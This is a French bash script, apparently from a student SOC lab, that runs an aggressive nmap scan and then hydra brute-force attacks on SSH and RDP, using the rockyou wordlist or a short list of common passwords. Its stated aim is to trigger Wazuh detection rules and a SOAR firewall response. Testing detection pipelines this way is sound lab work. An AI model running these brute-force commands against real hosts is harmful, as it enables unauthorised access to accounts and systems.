#!/bin/bash
# ============================================================
#  ATTAQUE DE TEST - BTS CIEL IR - usage labo uniquement
#  Cible  : Win10-Test (172.16.2.5 — agent Wazuh id=002)
#  Objectif: declencher alerte Wazuh rule 5763 (SSH brute-force)
#            -> soar-notify.sh -> dashboard -> firewall-drop
# ============================================================

TARGET="${1:-172.16.2.5}"   # IP reelle de Win10-Test
LOG="/tmp/attack_$(date +%Y%m%d_%H%M%S).log"

echo "============================================" | tee "$LOG"
echo " ATTAQUE SOAR TEST - cible : $TARGET"       | tee -a "$LOG"
echo " Log : $LOG"                                 | tee -a "$LOG"
echo "============================================" | tee -a "$LOG"

# --- Phase 1 : scan nmap agressif ---
# Wazuh detecte les scans SYN agressifs (regles 5400+)
echo ""
echo "[1/3] Scan nmap agressif..." | tee -a "$LOG"
nmap -sS -A -T4 -p 22,80,135,139,443,445,3389 "$TARGET" -oN /tmp/scan_result.txt 2>/dev/null
cat /tmp/scan_result.txt | tee -a "$LOG"
echo "     Scan termine."

# --- Phase 2 : brute-force SSH ---
# Wazuh regles 5551/5763 -> level 10 (high) -> active-response
echo ""
echo "[2/3] Brute-force SSH (port 22)..." | tee -a "$LOG"
if [ -f /usr/share/wordlists/rockyou.txt ]; then
    WORDLIST="/usr/share/wordlists/rockyou.txt"
else
    printf "password\n123456\nadmin\ntest\nazerty\nletmein\nqwerty\nP@ssw0rd\nwelcome\n" > /tmp/mini.txt
    WORDLIST="/tmp/mini.txt"
fi

for USER in administrator admin user test; do
    echo "  -> hydra SSH user=$USER" | tee -a "$LOG"
    hydra -l "$USER" -P "$WORDLIST" -t 4 -f "$TARGET" ssh 2>/dev/null \
        | grep -E "login:|FAILED|host:" | head -3 | tee -a "$LOG"
done
echo "     SSH termine."

# --- Phase 3 : brute-force RDP ---
# Wazuh regles Windows 60122+ -> level 10-12
echo ""
echo "[3/3] Brute-force RDP (port 3389)..." | tee -a "$LOG"
printf "administrator\nadmin\nuser\n" > /tmp/users_rdp.txt
hydra -L /tmp/users_rdp.txt -P "$WORDLIST" -t 1 "$TARGET" rdp 2>/dev/null \
    | grep -E "login:|host:" | head -5 | tee -a "$LOG"
echo "     RDP termine."

echo "" | tee -a "$LOG"
echo "============================================" | tee -a "$LOG"
echo " FIN — surveille le dashboard :"             | tee -a "$LOG"
echo " https://172.16.1.15"                        | tee -a "$LOG"
echo " Log complet : $LOG"                         | tee -a "$LOG"
echo "============================================" | tee -a "$LOG"
